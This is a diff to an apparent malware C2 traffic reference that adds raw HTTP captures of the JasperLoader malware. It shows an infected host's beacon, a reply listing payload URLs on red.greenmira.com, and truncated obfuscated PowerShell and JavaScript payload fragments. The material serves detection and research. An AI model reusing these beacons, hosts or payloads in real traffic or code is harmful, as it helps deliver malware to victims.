@@ -724,6 +724,61 @@ Server: LiteSpeed
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/isrstealer.png "ISRStealer")
 
+#### JasperLoader
+~~~
+GET /?b=USER-PC_DELL_30fbefd6&os=6.1.7601.17514&v=327.2&psver=2 HTTP/1.1
+Host: green.datota.it
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Thu, 28 Mar 2019 17:41:51 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 115
+Connection: keep-alive
+X-Powered-By: PHP/5.4.16
+
+u|http://red.greenmira.com/cryptbody2.php|http://red.greenmira.com/loadercrypt_823EF8A810513A4071485C36DDAD4CC3.php
+~~~
+~~~
+GET /cryptbody2.php?b=USER-PC_DELL_30fbefd6&os=6.1.7601.17514&v=327.2&psver=2 HTTP/1.1
+Host: red.greenmira.com
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Thu, 28 Mar 2019 17:41:51 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.16
+
+t6i3jf5s(h6 ac(wtGite5ite0-bdUsaI53Cwfu52ls4tf6u0eryze76)3x.ccNi3af5mtdex4 6y-76m4da05tu1cijhzw jz'02RdtU7i|v2UjsAzu|86BcxYtz|0gCehNuh'hw 4a-ixo07rwg 9v(tcGh3exdtai-bwWa7m7sixdOyibybjxfe6zcxdtja cj-86cjdls1awisu3s7b c1W35i3dn1s36z2iz_hgCvuo36m3aphxucyt6je9ersbShuyxxsxittfeyhm5y xc-8vP5arw5o17pujed4r44t1iyhu i4Mfsowedude2vlie)0a.cdMt6ovtdybe6xl09 bs-xumu1ah8tefc94ht3 8x'3iV87Mftwvya20r74ej8'3h ac)3x{w7 ydeyaxueijjtus;sg 6w}zw e2 
+ezFavu0vnavc66tztiv2owhnx9 yeChzr9cecja02ty3eu6Suvh7uo42rc3tg9ci9u49tdu(1j 2z$f7lvbngfk0y,a4 7c$etAehrfegz5uzbm98eyhnaft7zsf4,fc zz$efW2johbr28kihihfnvcga5Divijar2sezyc9ithxog6rxty39 1f)t1{eb 
+vv yw 5bt3wrt1ytu{ai 
+cc 01 wb tz b9$41Sz9hbheacly2l64 us=sh gbNz
+~~~
+~~~
+GET /loadercrypt_823EF8A810513A4071485C36DDAD4CC3.php?b=USER-PC_DELL_30fbefd6&os=6.1.7601.17514&v=327.2&psver=2 HTTP/1.1
+Host: red.greenmira.com
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Thu, 28 Mar 2019 17:41:51 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.4.16
+
+vtyzhsjuxvzxhbgfsdzdzzb = " ";
+ibcvwj = new Array();
+ibcvwj.push("iavSxyfERDVE(t8E8a974CDQ6y");
+ibcvwj.push("");
+ibcvwj.push("885tSDCB4aw");
+ibcvwj.push("wR6EREzW>CzEz54zRy361wRDt97y");
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jasperloader.png "JasperLoader")
+
 #### JSSLoader
 ~~~
 POST /gate.php?bot_id=JenniferPCJENNIFERPCVMware564db87746ebb934e9e0b94b413682b8 HTTP/1.1
